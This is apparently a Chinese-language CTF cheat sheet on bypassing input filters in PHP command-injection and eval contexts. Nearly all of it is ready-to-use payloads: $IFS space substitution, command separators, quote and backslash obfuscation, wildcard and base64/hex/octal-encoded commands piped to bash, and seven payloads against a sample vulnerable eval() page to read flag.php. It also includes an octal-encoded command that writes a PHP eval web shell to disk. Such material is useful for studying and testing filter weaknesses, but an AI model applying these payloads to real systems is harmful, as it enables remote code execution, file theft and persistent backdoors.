# 命令执行Bypass

## 针对情况

这里主要针对`system("$a");`变量a可控的这种情况，这里仅仅将一些常见的情况，特殊情况我们单独讲解

## 绕过空格

```php
常见的绕过符号有：
$IFS$9 、${IFS} 、%09(php环境下)、 重定向符<>、<、

#$IFS在linux下表示分隔符，如果不加{}则bash会将IFS解释为一个变量名，
加一个{}就固定了变量名，$IFS$9后面之所以加个$是为了起到截断的作用
```

## 命令分隔

```php
%0a  --换行符，需要php环境
%0d  --回车符，需要php环境
;  --在 shell 中，是”连续指令”
&  --不管第一条命令成功与否，都会执行第二条命令
&&  --第一条命令成功，第二条才会执行
|  --第一条命令的结果，作为第二条命令的输入
||  --第一条命令失败，第二条才会执行

```

## **单引号和双引号绕过**

```php
whoa'm'i
whoa"m"i
```

## 读取文件的函数

```php
strings:读取其中字符串
more:一页一页的显示档案内容
less:与 more 类似 head:查看头几行
tac:从最后一行开始显示，可以看出 tac 是
cat 的反向显示
tail:查看尾几行
nl：显示的时候，顺便输出行号
od:以二进制的方式读取档案内容
vi:一种编辑器，这个也可以查看
vim:一种编辑器，这个也可以查看
sort:可以查看
uniq:可以查看 file -f:报错出具体内容 grep
1、在当前目录中，查找后缀有 file 字样的文件中包含 test 字符串的文件，并打印出该字符串的行。此时，可以使用如下命令： grep test *file strings
```



## 绕过正则匹配

可以使用通配符`?`,`*`，使用转义字符`\`(在linux里面执行`whoami`=`whoam\i`)

举个简单例子

```php
<?php
error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag/i", $c)){
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
}

```

姿势很多

```php
通配符
payload1:c=system("nl fla?????");
payload2:c=system("nl fla*");
payload3:c=echo `nl fl''ag.php`;或者c=echo `nl fl“”ag.php`;
payload4:c=echo `nl fl\ag.php`;//转义字符绕过
payload5:c=include($_GET[1]);&1=php://filter/read=convert.base64-encode/resource=flag.php
payload6:c=eval($_GET[1]);&1=system('nl flag.php');
payload7:c=awk '{printf $0}' flag.php||
还有很多姿势，毕竟等于没过滤
```

当然还可以编码绕过

```php
#base64
echo "Y2F0IC9mbGFn"|base64 -d|bash ==>cat /flag
echo Y2F0IC9mbGFn|base64 -d|sh==>cat /flag
#hex
echo "0x636174202f666c6167" | xxd -r -p|bash ==>cat /flag
#oct/字节
$(printf "\154\163") ==>ls
$(printf "\x63\x61\x74\x20\x2f\x66\x6c\x61\x67") ==>cat /flag
{printf,"\x63\x61\x74\x20\x2f\x66\x6c\x61\x67"}|\$0 ==>cat /flag
#i也可以通过这种方式写马
内容为<?php @eval($_POST['c']);?>
${printf,"\74\77\160\150\160\40\100\145\166\141\154\50\44\137\120\117\123\124\133\47\143\47\135\51\73\77\76"} >> 1.php
```

## 通配符

linux里有两个通配符`?`和`*`前者代表0或一个字符，后者代表任意个字符

```php
/???/????64 ????????
```

看到上面这个了吗，比较特殊指的是`/bin/base64`当然不是每个系统都有

